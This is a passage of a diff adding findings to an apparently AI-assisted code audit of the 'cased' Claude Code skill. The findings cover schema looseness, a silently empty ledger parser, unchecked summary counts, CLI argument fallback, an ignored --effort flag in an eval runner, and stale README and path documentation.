+          CLI help and in SKILL.md's finalize paragraph, and make finalize refuse unless
+          `ledger` was run separately — but the first option is the one that matches the
+          documented contract.
+        temporal:
+          introduced: 2026-08-28
+          last_modified: 2026-08-28
+          commit_count: 1
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - bare-catch-erases-failure-cause
+            - finalize-gate-branches-untested
+        effort: small
+        effort_notes: Lift the gitLog closure from the ledger subcommand into finalizeAudit; add a gates test.
+        origin:
+          kind: pre-existing
+        failure_mode: internal
+      - slug: crustoleum-run-tools-path-unresolvable-from-cased
+        title: Phase 2 tells the controller to run run-tools at a path cased does not have
+        concern: moderate
+        locations:
+          - path: skills/cased/SKILL.md
+            start_line: 243
+            end_line: 244
+        evidence: |
+          1. Load the skill (`skill: crustoleum`) to get the full rubric.
+          2. Run the skill's tool prerequisites (e.g., `${CLAUDE_SKILL_DIR}/scripts/run-tools --full`).
+        evidence_lang: markdown
+        evidence_markers:
+          - lines: "2"
+            type: del
+            label: CLAUDE_SKILL_DIR here is cased's dir, which has no scripts/run-tools
+        mechanism: |
+          Inside cased's own SKILL.md, `${CLAUDE_SKILL_DIR}` expands to the cased skill
+          directory. skills/cased/scripts/ contains build-report.js, recon, and
+          recon-to-yaml.mjs — there is no run-tools. run-tools lives in
+          skills/crustoleum/scripts/run-tools. Followed literally, step 2 of the
+          domain-skill path resolves to a nonexistent file, so the cargo tooling that feeds
+          the Supply Chain, Safety, and Performance surfaces (clippy, audit, deny, geiger,
+          miri) is never run and the crustoleum agents analyse without the `.crustoleum/`
+          output their rubrics tell them to read. Step 5 of the same list gets this right and
+          shows the author knows the hazard — it says to resolve the agents directory "from
+          the base directory reported when the crustoleum skill is loaded". Step 2 is the one
+          site in the file that was not given the same treatment; every `${CLAUDE_SKILL_DIR}`
+          reference in skills/cased/ and skills/crustoleum/ was grepped and this is the only
+          cross-skill path left unqualified (crustoleum's agents correctly write "cased's
+          `references/subagent-output-contract.md`" when pointing outside their own skill).
+        remediation: |
+          Rewrite step 2 the way step 5 does: "Run the skill's tool prerequisites —
+          `<crustoleum-skill-dir>/scripts/run-tools --full`, resolving the directory from the
+          base path reported when the crustoleum skill is loaded." Do not use
+          `${CLAUDE_SKILL_DIR}` for any path outside the cased skill.
+        temporal:
+          introduced: 2026-04-08
+          last_modified: 2026-08-28
+          commit_count: 21
+        chains:
+          enables: []
+          enabled_by: []
+          related: []
+        effort: trivial
+        effort_notes: One sentence in SKILL.md; rebuild is not required (SKILL.md is authored, not generated).
+        origin:
+          kind: pre-existing
+        failure_mode: documentation
+      - slug: codex-max-threads-undercounts-agents
+        title: Codex adapter says the default thread cap matches the agent count; it is one short
+        concern: moderate
+        locations:
+          - path: skills/cased/references/codex-tools.md
+            start_line: 47
+            end_line: 50
+        evidence: |
+          The `agents.max_threads` default is 6, which matches the cased agent
+          count exactly (security, error-handling, code-quality, completeness,
+          dependencies, api-design/performance). Leave the default unless an
+          audit requires more surfaces.
+        evidence_lang: markdown
+        evidence_markers:
+          - lines: 1-3
+            type: del
+            label: 7 agents can be dispatched, not 6
+        mechanism: |
+          Both dispatch paths in SKILL.md can reach seven concurrent agents, not six. The
+          no-domain-skill path dispatches four always (security, error-handling, code-quality,
+          completeness) plus three conditionals — dependencies, api-design, performance — all
+          of which apply to an ordinary library with a manifest, a public API and a hot path.
+          The domain-skill path dispatches crustoleum's six agents plus cased's completeness,
+          which SKILL.md step 5 explicitly adds. The adapter's own parenthetical hides this by
+          writing "api-design/performance" as a single slot. Since this file's entire purpose
+          is preventing Phase 2 from silently degrading on Codex — the README calls that
+          degradation "a worse audit wearing the same name" — telling the operator to leave a
+          cap of 6 in place is the one instruction here that can reintroduce the failure it
+          exists to prevent. The advice is also self-inconsistent with the pseudocode at
+          codex-tools.md:179-186, which lists six spawn_agent calls and omits performance.
+        remediation: |
+          Correct the count to seven and change the guidance: "cased dispatches up to seven
+          agents (six crustoleum surfaces plus completeness on the domain-skill path; four
+          always plus up to three conditionals otherwise). Raise `agents.max_threads` to at
+          least 7 so no surface is queued behind another." Add performance to the pseudocode
+          block so the two sections agree.
+        temporal:
+          introduced: 2026-04-12
+          last_modified: 2026-08-28
+          commit_count: 4
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - readme-crustoleum-counts-and-agent-table-stale
+        effort: trivial
+        effort_notes: Two short edits in one reference file.
+        origin:
+          kind: pre-existing
+        failure_mode: documentation
+      - slug: readme-crustoleum-counts-and-agent-table-stale
+        title: README undersells crustoleum and omits the Completeness agent from its roster
+        concern: advisory
+        locations:
+          - path: README.md
+            start_line: 45
+            end_line: 56
+          - path: README.md
+            start_line: 181
+            end_line: 181
+        evidence: |
+          **Without a domain skill** (any language):
+
+          | Agent | What it evaluates |
+          |-------|------------------|
+          | Security | Injection, auth bypass, secrets, input validation |
+          | Error Handling | Silent failures, crash risks, error context |
+          | Code Quality | Complexity, duplication, dead code, test gaps |
+          | Performance | Algorithmic complexity, resource leaks, hot paths |
+          | API Design | Public surface consistency, naming, contracts |
+          | Dependencies | Outdated versions, advisories, license risks |
+
+          Domain skills go deeper — crustoleum brings 84 binary criteria across 13 surfaces. The generic agents cover the fundamentals for any codebase.
+          | Rust | [crustoleum](https://github.com/claylo/crustoleum) | 13 surfaces, 84 criteria, cargo tooling (clippy, audit, deny, geiger, miri, sanitizers) |
+        evidence_lang: markdown
+        evidence_markers:
+          - lines: 5-10
+            type: mark
+            label: Completeness is missing, though SKILL.md dispatches it Always
+          - lines: "12"
+            type: del
+            label: crustoleum ships 89 criteria across 14 surfaces
+          - lines: "13"
+            type: del
+            label: same stale numbers in the domain-skill table
+        mechanism: |
+          crustoleum ships fourteen surfaces and eighty-nine criteria — its SKILL.md surface
+          table totals "89 criteria across 14 surfaces" at line 68, its own README opens with
+          "Fourteen surfaces. Eighty-nine binary criteria", and cased's SKILL.md agrees
+          ("14 surfaces, 89 criteria"). Only cased's README still carries the pre-merge
+          13/84 figures, in both places it quotes them. Separately, the "Without a domain
+          skill" roster lists six agents but SKILL.md's dispatch rules classify Completeness as
+          Always-dispatch alongside security, error-handling and code-quality, and ship
+          agents/completeness.md to back it; the README table is the only public description
+          of what a generic-language audit covers, and it omits a surface every such audit
+          actually runs. Nothing breaks, but a reader comparing the README against a rendered
+          report finds a narrative the README never mentioned and a domain skill smaller than
+          the one they get.
+        remediation: |
+          Update both README figures to "89 criteria across 14 surfaces" / "14 surfaces,
+          89 criteria", and add a Completeness row to the "Without a domain skill" table
+          ("Documented features, API promises, era expectations"). Since these numbers live in
+          three files, consider having the counts quoted in one place and referenced from the
+          others.
+        temporal:
+          introduced: 2026-03-21
+          last_modified: 2026-08-10
+          commit_count: 5
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - agents-md-stale-after-prelaunch-cleanup
+            - codex-max-threads-undercounts-agents
+        effort: trivial
+        effort_notes: Three edits in README.md.
+        origin:
+          kind: pre-existing
+        failure_mode: documentation
+      - slug: readme-primary-install-path-unverified
+        title: The install command README leads with has nothing in the repo backing it
+        concern: advisory
+        locations:
+          - path: README.md
+            start_line: 69
+            end_line: 72
+        evidence: |
+          Cased is a Claude Code skill — a prompt-and-script package that Claude Code loads on demand.
+
+          ```sh
+          npx @anthropic-ai/claude-code-skill install claylo/cased
+        evidence_lang: markdown
+        evidence_markers:
+          - lines: "4"
+            type: mark
+            label: no packaging metadata in the repo supports this
+        mechanism: |
+          This is the first install path a reader tries, and the repository contains nothing
+          that would make it work: there is no package.json `name` field (package.json declares
+          only devDependencies), no .claude-plugin/ directory, no plugin.json, and no
+          marketplace entry — the tree was searched for all of them. The manual path below it
+          (clone plus a symlink into ~/.claude/skills/cased) is the one the rest of the project
+          is built around: AGENTS.md's "Verify through the skill path" rule describes exactly
+          that symlink, and scripts/build-viewer.sh stamps into skills/cased/ on that
+          assumption. Whether the npm package @anthropic-ai/claude-code-skill exists or accepts
+          a `claylo/cased` argument could not be verified from here; what is verifiable is that
+          this repo publishes nothing that such a command could resolve. For a pre-publish
+          project, a broken first-line install instruction is the highest-cost documentation
+          defect available.
+        remediation: |
+          Run the command against a clean machine before publishing. If it does not resolve,
+          lead with the manual clone-and-symlink block (and the ~/.codex/skills path AGENTS.md
+          mentions) and drop the npx line, or add the packaging metadata that makes it real.
+        temporal:
+          introduced: 2026-03-21
+          last_modified: 2026-08-10
+          commit_count: 5
+        chains:
+          enables: []
+          enabled_by: []
+          related: []
+        effort: trivial
+        effort_notes: Verify once, then either delete four lines or add packaging metadata.
+        origin:
+          kind: pre-existing
+        failure_mode: documentation
+  - slug: api-design-surface
+    title: The API Design Surface
+    thesis: The contract is coherent where the schema enforces it and drifts where it does not — open objects, write-only fields, author-supplied counts, and a ledger parser that accepts a field it cannot read.
+    verdict: "Nothing is broken today because every producer is the same author's model prompts, but the contract is the product: a third party writing findings.yaml or actions-taken.md gets no error for `criterion`, for a miscounted `summary`, or for an `Addresses` line without link syntax. Tightening the schema and cross-checking counts at build time closes most of it."
+    flow:
+      - id: src
+        label: src/schemas/*.json
+        type: start
+      - id: stamp
+        label: build-schemas.sh stamps
+        type: process
+      - id: agent
+        label: subagent emits finding
+        type: process
+        findings:
+          - slug: contract-fields-absent-from-schema
+            label: criterion/surface
+      - id: validate
+        label: ajv validate
+        type: process
+        findings:
+          - slug: findings-schema-accepts-unknown-keys
+            label: open objects
+          - slug: summary-counts-never-cross-checked
+            label: counts unchecked
+      - id: ledger
+        label: actions-taken.md lint
+        type: end
+        findings:
+          - slug: ledger-addresses-silently-parses-nothing
+            label: Addresses ignored
+    findings:
+      - slug: contract-fields-absent-from-schema
+        title: Subagent contract mandates `criterion` and `surface`; the findings schema defines neither
+        concern: moderate
+        locations:
+          - path: skills/cased/agents/api-design.md
+            start_line: 90
+            end_line: 91
+          - path: skills/cased/references/subagent-output-contract.md
+            start_line: 86
+            end_line: 87
+          - path: src/schemas/findings.schema.json
+            start_line: 51
+            end_line: 55
+        evidence: |
+          - `findings[].criterion:` — use the `API-N` prefix matching the criterion you evaluated.
+          - `findings[].surface:` — always `"API Design"` (maps to the narrative title).
+              criterion: "<YOUR_PREFIX>-N"         # e.g. SEC-1, CQ-3 — see your rubric
+              surface: "<Your Surface Name>"       # maps to the narrative title
+                        "required": ["slug", "title", "concern", "locations", "evidence", "mechanism", "remediation"],
+                        "properties": {
+                          "slug": { "type": "string", "pattern": "^[a-z0-9-]+$" },
+                          "title": { "type": "string", "description": "Human-readable finding title" },
+                          "concern": { "type": "string", "enum": ["critical", "significant", "moderate", "advisory", "note"] },
+        evidence_lang: markdown
+        evidence_markers:
+          - lines: 5-9
+            type: del
+            label: criterion/surface appear in neither required nor properties
+        mechanism: |
+          Every analysis rubric (all seven of `skills/cased/agents/{api-design,code-quality,completeness,dependencies,error-handling,performance,security}.md`, grepped for `findings[].criterion`) and the shared output contract instruct subagents to emit `criterion` and `surface` on every finding, and the contract states that `surface` "maps to the narrative title". Neither field exists in `findings.schema.json` — not in `required`, not in `properties` — and neither appears in `findings.example.yaml`, `findings-schema.yaml.md`, or `SKILL.md` (grepped: zero hits outside the rubrics and the contract). They survive `build-report.js validate` only because the finding-level object has no `additionalProperties` bound, and nothing in `build-report.mjs` reads them, so the promised surface-to-narrative mapping is never checked and the criterion tag never reaches the report. Two of the contract's own fields are write-only. This audit is a live example: every agent emitted both fields and the controller stripped them during assembly because the schema has nowhere to keep them.
+        remediation: |
+          Pick one direction and make the whole contract agree. Either add `criterion` (string, pattern `^[A-Z]+-[0-9]+$`) and `surface` (string) to `findings.schema.json` under the finding object, show them in `findings.example.yaml`, document them in `findings-schema.yaml.md`, and have the controller assert that each finding's `surface` equals its narrative's `title`; or drop both fields from `subagent-output-contract.md` and all seven rubrics and state that surface attribution is carried by the narrative grouping alone.
+        temporal:
+          introduced: 2026-04-12
+          last_modified: 2026-08-28
+        chains:
+          enables: []
+          enabled_by:
+            - findings-schema-accepts-unknown-keys
+          related: []
+        effort: small
+        effort_notes: One schema edit plus an example and a prose paragraph, or a deletion across eight prose files.
+        origin:
+          kind: pre-existing
+        failure_mode: documentation
+      - slug: findings-schema-accepts-unknown-keys
+        title: findings.schema.json leaves 11 of 14 objects open while recon.schema.json locks 15 of 16
+        concern: moderate
+        locations:
+          - path: src/schemas/recon.schema.json
+            start_line: 1
+            end_line: 13
+          - path: src/schemas/findings.schema.json
+            start_line: 12
+            end_line: 17
+          - path: src/schemas/findings.schema.json
+            start_line: 111
+            end_line: 115
+        evidence: |
+          {
+            "$schema": "https://json-schema.org/draft/2020-12/schema",
+            "$id": "https://cased.dev/schemas/recon.schema.json",
+            "title": "Cased Recon",
+            "description": "Structural model of a codebase gathered during the reconnaissance phase of an audit.",
+            "type": "object",
+            "required": ["meta", "structure"],
+            "additionalProperties": false,
+            "properties": {
+              "meta": {
+                "type": "object",
+                "required": ["project", "commit", "timestamp", "scope", "audit_profile"],
+                "additionalProperties": false,
+              "narratives": {
+                "type": "array",
+                "items": {
+                  "type": "object",
+                  "required": ["slug", "title", "thesis", "verdict", "findings"],
+                  "properties": {
+                          "origin": {
+                            "type": "object",
+                            "required": ["kind"],
+                            "additionalProperties": false,
+                            "properties": {
+        evidence_lang: json
+        evidence_markers:
+          - lines: "8"
+            type: ins
+            label: "recon: closed at every level"
+          - lines: 14-19
+            type: del
+            label: "findings.narratives: no additionalProperties bound"
+        mechanism: |
+          The two halves of the same contract apply opposite strictness policies. `recon.schema.json` sets `additionalProperties: false` on 15 of its 16 object schemas (only the inline `skill_versions` object at line 46 is left open); `findings.schema.json` sets it on only 3 of 14 (origin, carried_forward.items, reconciliation.items), leaving the root, narratives.items, findings.items, locations.items, evidence_markers.items, temporal, chains, flow.items, summary, summary.counts and origin's siblings open. Recon is machine-generated by `recon-to-yaml.mjs` and is the half that is locked; findings.yaml is authored by an LLM and is the half that is not — exactly backwards for where typos happen. A misspelled optional key silently degrades behaviour rather than failing validation: `orign:` drops the finding out of `finalizeAudit`'s caused-by-fix/recurrence-of check (build-report.mjs:808-812) and out of the eval's `origin_coverage` metric; `temporal:` misspelled silently suppresses the sparkline; `failure-mode:` instead of `failure_mode:` falls into `isBlocking`'s `?? 'user-visible'` default (gates.mjs:11), silently promoting a finding onto the release-gating list. `validate` reports ok in every case.
+        remediation: |
+          Add `"additionalProperties": false` to the remaining object schemas in `findings.schema.json`, matching the policy recon.schema.json already uses, and run `just build-smoke` plus the existing audits under `record/audits/` through `build-report.js validate` to find fields in use that the schema never declared (this finding's `criterion`/`surface` pair among them). If a genuinely open bag is wanted for forward compatibility, say so explicitly with an `"additionalProperties": {"type": "string"}`-style bound or a documented `x-` prefix convention rather than leaving it unstated.
+        temporal:
+          introduced: 2026-04-10
+          last_modified: 2026-08-28
+        chains:
+          enables:
+            - contract-fields-absent-from-schema
+          enabled_by: []
+          related:
+            - summary-counts-never-cross-checked
+        effort: medium
+        effort_notes: The edit is mechanical, but every existing findings.yaml and the example must be re-validated before it can land.
+        origin:
+          kind: pre-existing
+        failure_mode: internal
+      - slug: summary-counts-never-cross-checked
+        title: summary.counts is author-supplied and never reconciled with the findings it describes
+        concern: moderate
+        locations:
+          - path: src/viewer/build-report.mjs
+            start_line: 348
+            end_line: 353
+          - path: src/schemas/findings.schema.json
+            start_line: 134
+            end_line: 141
+        evidence: |
+          export function renderHeader(findings) {
+            const counts = findings.summary?.counts || {};
+            const total = Object.values(counts).reduce((a, b) => a + b, 0);
+            const assessment = findings.assessment || '';
+            const { blocking, backlog } = blockingCounts(findings);
+            const glossary = buildGlossary(counts, blocking, backlog);
+              "summary": {
+                "type": "object",
+                "required": ["counts"],
+                "properties": {
+                  "counts": {
+                    "type": "object",
+                    "required": ["critical", "significant", "moderate", "advisory", "note"],
+                    "properties": {
+        evidence_lang: javascript
+        evidence_markers:
+          - lines: "2"
+            type: mark
+            label: counts rendered as authored; nothing reconciles them
+          - lines: "5"
+            type: ins
+            label: blocking/backlog on the next line ARE derived from the findings
+        mechanism: |
+          `summary.counts` is a model-authored tally that the schema requires but never relates to `narratives[].findings[]`, and no gate closes the loop: `gates.mjs` checks README placeholders, audit_profile completeness, evidence fidelity and the ledger's front-matter arithmetic, but nothing recomputes the concern histogram. `renderHeader` prints those numbers directly in the summary bar and the glossary while, on the same line, `blockingCounts()` derives blocking/backlog from the real findings — so a miscount renders a report that contradicts itself: the header can claim "12 findings" above a Remediation Ledger listing 15 rows, and `finalize` still exits 0. The asymmetry is stark against `lintLedger`, which does exactly this check for actions-taken.md (`front matter open=${s.open} but findings(${total}) − dispositioned(${others})`, gates.mjs:91) — the ledger's arithmetic is enforced, the report's is not.
+        remediation: |
+          Add a `checkSummaryCounts(findings)` gate to `gates.mjs` that recomputes the per-concern histogram from `allFindings(findings)` and errors on any mismatch, and call it from `finalizeAudit` alongside `checkAuditProfile`. Alternatively drop `summary.counts` from the schema entirely and have `renderHeader`/`renderReadmeMd` derive the counts the way `blockingCounts` already does — the field carries no information the findings do not.
+        temporal:
+          introduced: 2026-04-05
+          last_modified: 2026-08-28
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - findings-schema-accepts-unknown-keys
+        effort: small
+        effort_notes: One gate function, one call site, one unit test alongside the existing gates tests.
+        origin:
+          kind: pre-existing
+        failure_mode: user-visible
+      - slug: ledger-addresses-silently-parses-nothing
+        title: A ledger entry whose Addresses field omits link syntax lints clean and records no slugs
+        concern: moderate
+        locations:
+          - path: skills/cased/references/actions-taken-schema.md
+            start_line: 41
+            end_line: 41
+          - path: src/viewer/prior-audits.mjs
+            start_line: 30
+            end_line: 30
+          - path: src/viewer/gates.mjs
+            start_line: 98
+            end_line: 100
+        evidence: |
+          **Addresses:** [{slug}](README.md#{slug}), …
+              const addresses = [...(fields.Addresses ?? '').matchAll(/\[([^\]]+)\]/g)].map(m => m[1]);
+              if (!f.Addresses) err(e.heading, 'missing **Addresses:**');
+              if (!f.Author) err(e.heading, 'missing **Author:**');
+              for (const slug of e.addresses) if (!known.has(slug)) err(e.heading, `Addresses unknown slug '${slug}' (not in findings.yaml or carried_forward)`);
+        evidence_lang: markdown
+        evidence_markers:
+          - lines: "2"
+            type: mark
+            label: brackets are load-bearing
+          - lines: "3"
+            type: del
+            label: presence is checked; the bracket syntax that carries the slugs is not
+        mechanism: |
+          `parseLedger` extracts finding slugs from the `Addresses` field only via `matchAll(/\[([^\]]+)\]/g)` — the markdown link brackets are load-bearing, but `actions-taken-schema.md` presents them as a formatting convention ("Linking: each finding slug in the Addresses field links back to the finding's anchor") and never says the linter cannot see a bare slug. `lintLedger` then checks only that the field is non-empty, and iterates `e.addresses` — which is `[]`. So `**Addresses:** silent-write-discard` passes `build-report.js ledger` with zero errors while addressing nothing: the unknown-slug check is vacuous, `latestDispositions` records no disposition, and the eval scorer's `count('fixed')`/`false_positive_disputed`/`note_bait_slug` checks in `scoreRemediation` all read empty. The one gate that exists to keep remediation honest reports "ledger ok" on a ledger that tracks nothing.
+        remediation: |
+          In `lintLedger`, error when `f.Addresses` is present but `e.addresses` is empty — `Addresses must cite slugs as [slug](README.md#slug); none parsed` — so the syntax requirement fails loudly instead of silently. State in `actions-taken-schema.md` that the bracket form is what the linter parses, not decoration.
+        temporal:
+          introduced: 2026-08-28
+          last_modified: 2026-08-28
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - disposition-vocabulary-triplicated
+        effort: trivial
+        effort_notes: One conditional in lintLedger plus a sentence in the schema doc.
+        origin:
+          kind: pre-existing
+        failure_mode: user-visible
+      - slug: build-report-subcommand-fallback
+        title: An unrecognised build-report subcommand becomes the audit directory, and `build` validates nothing
+        concern: moderate
+        locations:
+          - path: src/viewer/build-report.mjs
+            start_line: 941
+            end_line: 953
+          - path: src/viewer/build-report.mjs
+            start_line: 1006
+            end_line: 1016
+        evidence: |
+          if (realpathSync(process.argv[1]) === realpathSync(fileURLToPath(import.meta.url))) {
+            (async () => {
+              // Parse subcommand: `validate <dir>` or `build <dir>`; bare `<dir>` is
+              // treated as `build` for backward compatibility.
+              const rawArgs = process.argv.slice(2);
+              const SUBCOMMANDS = ['build', 'validate', 'evidence', 'ledger', 'finalize'];
+              const positional = rawArgs.filter(a => !a.startsWith('--'));
+              let subcommand = 'build';
+              let auditDir = positional[0];
+              if (SUBCOMMANDS.includes(positional[0])) {
+                subcommand = positional[0];
+                auditDir = positional[1];
+              }
+              if (subcommand === 'ledger') {
+                const ledgerPath = join(auditDir, 'actions-taken.md');
+                if (!existsSync(ledgerPath)) {
+                  console.error(`error: ${ledgerPath} does not exist`);
+                  process.exit(1);
+                }
+                const findingsPath = join(auditDir, 'findings.yaml');
+                if (!existsSync(findingsPath)) {
+                  console.error(`error: ${findingsPath} not found`);
+                  process.exit(2);
+                }
+        evidence_lang: javascript
+        evidence_markers:
+          - lines: "10"
+            type: mark
+            label: an unrecognised subcommand silently becomes the audit directory
+          - lines: "17"
+            type: del
+            label: exit 1 for a missing ledger…
+          - lines: "22"
+            type: del
+            label: …exit 2 for a missing findings.yaml, five lines later
+        mechanism: |
+          The bare-`<dir>` back-compat path means the parser can never reject a subcommand: anything not in `SUBCOMMANDS` is reinterpreted as an audit directory. `build-report.js validte record/audits/x` therefore runs `build` against a directory named `validte`, and because the `build` path — unlike `validate`, `evidence`, `ledger` and `finalize`, which all `existsSync`-check their inputs — never checks its argument, the first thing the user sees is an uncaught ENOENT rejection from `readFileSync(join(auditDir, 'findings.yaml'))` in `assembleReport`, naming a path they never typed. Unknown `--flags` are likewise dropped by the `filter(a => !a.startsWith('--'))` with no diagnostic. The exit codes are ad hoc in the same region: within one subcommand a missing actions-taken.md exits 1 while a missing findings.yaml exits 2, `validate` exits 2 for an unlocatable schema dir but 1 for schema violations, and the usage text documents no exit-code contract at all — unlike `src/recon/recon`, which documents 0/1/2/3/4, and `score-eval.mjs`, which documents 0/2.
+        remediation: |
+          Reject an unrecognised first positional that looks like a subcommand (no path separator and not an existing directory) with the usage text and a non-zero exit; keep the bare-directory form only when the argument resolves to a directory. Add the same `existsSync` guard on `auditDir`/`findings.yaml` to the `build` path that the other four subcommands have, error on unknown `--flags` rather than filtering them away, and document the exit-code contract in the usage block the way `src/recon/recon` does — 1 for usage, 2 for missing inputs, 1 for gate failures — then make the `ledger` missing-file case use 2 consistently.
+        temporal:
+          introduced: 2026-04-05
+          last_modified: 2026-08-28
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - shipped-help-names-source-paths
+            - build-subcommand-unguarded-io
+        effort: small
+        effort_notes: Localised to the CLI entry block; the gate subcommands already show the pattern to copy.
+        origin:
+          kind: pre-existing
+        failure_mode: user-visible
+      - slug: run-eval-effort-ignored-on-claude
+        title: run-eval records --effort in the run slug and provenance but never applies it on the claude platform
+        concern: moderate
+        locations:
+          - path: evals/scripts/run-eval
+            start_line: 67
+            end_line: 69
+          - path: evals/scripts/run-eval
+            start_line: 140
+            end_line: 144
+        evidence: |
+          TS="$(TZ='America/New_York' date +%Y-%m-%d-%H%M%S)"
+          RUN_SLUG="$TS-$PLATFORM-$MODEL-$EFFORT"
+          [[ "$MODE" == "remediate" ]] && RUN_SLUG="$RUN_SLUG-remediate"
+          case "$PLATFORM" in
+            claude)
+              CMD=(claude -p "$PROMPT" --output-format text --permission-mode acceptEdits --allowedTools "$ALLOWED_TOOLS")
+              [[ "$MODEL" != "default" ]] && CMD+=(--model "$MODEL")
+              ;;
+        evidence_lang: bash
+        evidence_markers:
+          - lines: "2"
+            type: mark
+            label: effort lands in the run slug and provenance
+          - lines: "7"
+            type: del
+            label: --model is applied here; --effort never is
+        mechanism: |
+          `--effort` is accepted by the argument loop for every platform, but only the `codex` branch consumes it (`-c model_reasoning_effort=...`, line 163). On `--platform claude` the value is silently discarded from the command while still flowing into `RUN_SLUG` (line 68), into `run-meta.yaml`'s `effort:` field (line 261), and from there into `compare-runs.mjs`'s run label `${meta.platform}/${meta.model}/${meta.effort ?? '?'}`. The result contradicts this file's own stated contract — "The RUNNER records platform/model/effort — provenance is never self-reported by the model" — because the recorded provenance is not what ran. Two `run-eval --platform claude --effort high` and `--effort low` invocations produce identically-configured sessions filed under differently-labelled run directories, and the matrix comparison then attributes their normal run-to-run variance to an effort axis that was never set.
+        remediation: |
+          Reject the combination explicitly in the `claude)` branch — `[[ "$EFFORT" != "default" ]] && { echo "error: --effort is not supported for --platform claude" >&2; exit 1; }` — or map it to a real Claude Code knob if one exists. Whichever way, the recorded `effort:` in run-meta.yaml and the run slug must only ever name a setting that was actually applied.
+        temporal:
+          introduced: 2026-08-10
+          last_modified: 2026-08-28
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - entrypoint-guard-unresolved-path
+        effort: trivial
+        effort_notes: A four-line guard in the existing platform case statement.
+        origin:
+          kind: pre-existing
+        failure_mode: user-visible
+      - slug: shipped-help-names-source-paths
+        title: Shipped CLI help text names source-tree paths that do not exist in an installed skill
+        concern: advisory
+        locations:
+          - path: src/recon/recon
+            start_line: 7
+            end_line: 8
+          - path: src/viewer/build-report.mjs
+            start_line: 956
+            end_line: 956
+        evidence: |
+          # Usage:
+          #   bash src/recon/recon <target-project-dir> <audit-dir>
+                console.error('Usage: node build-report.mjs [build|validate|evidence|ledger|finalize] <audit-directory>');
+        evidence_lang: bash
+        evidence_markers:
+          - lines: "2"
+            type: del
+            label: path does not exist in an installed skill
+          - lines: "3"
+            type: del
+            label: the shipped file is build-report.js
+        mechanism: |
+          Both files are stamped verbatim into the shipped skill (`skills/cased/scripts/recon` is byte-identical to `src/recon/recon`; `build-report.mjs` is bundled to `skills/cased/scripts/build-report.js`, where the same string survives at line 40794), so the help a skill user sees names paths from a repo they do not have. An installed skill contains `scripts/recon` and `scripts/build-report.js` — never `src/recon/recon`, never `build-report.mjs` — while `SKILL.md:134` and every other doc correctly say `${CLAUDE_SKILL_DIR}/scripts/recon` and `${CLAUDE_SKILL_DIR}/scripts/build-report.js`. The first thing a user does after an argument mistake is read the usage line, and it points at a file that is not there. `recon-to-yaml.mjs` gets this right, printing its own basename.
+        remediation: |
+          Print the invoked name rather than a hardcoded one: in `build-report.mjs` use `basename(process.argv[1])` in the usage string; in `src/recon/recon` change the header comment to `bash <skill-dir>/scripts/recon <target-project-dir> <audit-dir>` (the runtime usage error at line 22 already uses `$0` correctly). Re-run `just check-bundle` so the stamped copies follow.
+        temporal:
+          introduced: 2026-04-05
+          last_modified: 2026-08-28
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - build-report-subcommand-fallback
+        effort: trivial
+        effort_notes: Two string edits plus a bundle rebuild.
+        origin:
+          kind: pre-existing
+        failure_mode: documentation
+      - slug: disposition-vocabulary-triplicated
+        title: The eight-value disposition vocabulary is hardcoded in three places with no single source
+        concern: advisory
+        locations:
+          - path: src/viewer/gates.mjs
+            start_line: 73
+            end_line: 74
+          - path: src/viewer/gates.mjs
+            start_line: 90
+            end_line: 90
+          - path: src/viewer/prior-audits.mjs
+            start_line: 9
+            end_line: 9
+        evidence: |
+          const REQUIRE_COMMIT = new Set(['fixed', 'mitigated', 'superseded']);
+          const KNOWN = ['fixed', 'mitigated', 'accepted', 'disputed', 'deferred', 'escalated', 'superseded', 'no-measurable-benefit'];
+              const others = ['fixed', 'mitigated', 'accepted', 'disputed', 'deferred', 'escalated', 'superseded', 'no-measurable-benefit'].reduce((n, k) => n + (Number(s[k]) || 0), 0);
+          const DISPOSITIONS = ['fixed', 'mitigated', 'accepted', 'disputed', 'deferred', 'escalated', 'superseded', 'no-measurable-benefit'];
+        evidence_lang: javascript
+        evidence_markers:
+          - lines: 2-4
+            type: mark
+            label: the same eight-element list, three times
+        mechanism: |
+          The identical eight-element list is written out three times in code (`KNOWN`, the inline array inside the front-matter arithmetic four lines below it, and `DISPOSITIONS` in another module) and again in prose across `actions-taken-schema.md`'s front-matter template and its Dispositions section, with a partial copy as `REQUIRE_COMMIT` and an overlapping subset as the `carried_forward.disposition` enum in findings.schema.json. The copies are currently in sync, so nothing is broken today — but each feeds a different gate, and drift is silent in both directions: a value present in `KNOWN` but absent from `DISPOSITIONS` lints clean yet never registers a disposition in `latestDispositions` (feeding empty counts to `scoreRemediation`); miss the inline copy and every ledger using the new disposition fails the arithmetic check with a misleading "findings − dispositioned" message. Adding a ninth disposition — the kind of change this vocabulary has already seen twice — requires four coordinated edits with no test that catches missing one.
+        remediation: |
+          Define the vocabulary once in a small shared module (a new `src/viewer/ledger-vocab.mjs` avoids the existing gates.mjs → prior-audits.mjs import direction becoming circular), derive `KNOWN`, the front-matter summation and `REQUIRE_COMMIT` from it, reuse it as the enum source for the schema's `carried_forward.disposition`, and add a test asserting the code list matches the dispositions documented in `actions-taken-schema.md` so the prose copy cannot drift either.
+        temporal:
+          introduced: 2026-08-28
+          last_modified: 2026-08-28
+          commit_count: 1
+        chains:
+          enables: []
+          enabled_by: []
+          related:
+            - ledger-addresses-silently-parses-nothing
+            - flat-findings-traversal-reimplemented
+        effort: small
+        effort_notes: One export, three call-site edits, one drift test.
+        origin:
+          kind: pre-existing
+        failure_mode: internal
+  - slug: code-quality-surface
+    title: The Code Quality Surface
+    thesis: "A 1,100-line renderer grown by surgical edits: the logic is sound and well-tested at the function level, but the CLI tail, two template renderers, and four flatten helpers are copy-and-diverge waiting to happen."
+    verdict: Backlog, not blockers. The untested finalize branches and render/escape exports are the items with teeth — they guard the report and the release gate — and belong in the same sweep as the missing flow-to-svg tests. The duplication findings are cheap to fix now and expensive after the next feature.
+    findings:
+      - slug: build-report-cli-monolith
+        title: build-report.mjs ends in a 193-line untestable CLI closure handling five subcommands
+        concern: moderate
+        locations:
+          - path: src/viewer/build-report.mjs
+            start_line: 940
+            end_line: 953
+          - path: src/viewer/build-report.mjs
+            start_line: 1048
+            end_line: 1059
+        evidence: |
